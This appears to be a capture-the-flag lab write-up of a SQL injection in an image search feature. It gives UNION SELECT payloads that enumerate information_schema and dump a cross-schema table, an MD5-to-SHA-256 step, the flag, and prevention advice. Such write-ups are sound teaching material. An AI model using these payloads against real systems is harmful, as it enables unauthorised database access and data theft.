## Breach 11 – SQL Injection in Image Metadata Table (Cross-Schema Access)

**Vulnerability:**  
The image search or viewing functionality is vulnerable to SQL injection. The application fails to sanitize inputs, allowing attackers to access a separate schema and extract hidden data embedded in image metadata.

**OWASP Top 10 Mapping:**  
**A03:2021 – Injection**  
SQL injection used to access sensitive metadata and hidden clues across database schemas.

**Exploitation:**  
- Initiated SQL injection:
  ```sql
  1 UNION SELECT table_name, table_schema FROM information_schema.tables; --
  ```
  - Identified the table: `list_images` under schema `Member_images`.

- Discovered column names (trial-and-error based on known naming patterns):
  - `comment`
  - `title`

- Queried metadata:
  ```sql
  1 UNION SELECT comment, title FROM Member_images.list_images; --
  ```

- Found this row:
  ```
  comment: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
  title: Hack me ?
  ```

- Decrypted MD5 hash:
  ```
  1928e8083cf461a51303633093573c46 → albatroz
  ```

- Lowercased (already lowercase), then SHA-256 hashed:
  ```bash
  echo -n albatroz | sha256sum
  ```
  Result:
  ```
  f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
  ```

- Used the hash to obtain the flag.

**Prevention:**  
- Use parameterized queries for all dynamic SQL.
- Enforce strict input validation.
- Restrict cross-schema access unless explicitly required.
- Avoid embedding sensitive data in user-facing database records.

**Flag:**  
`f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
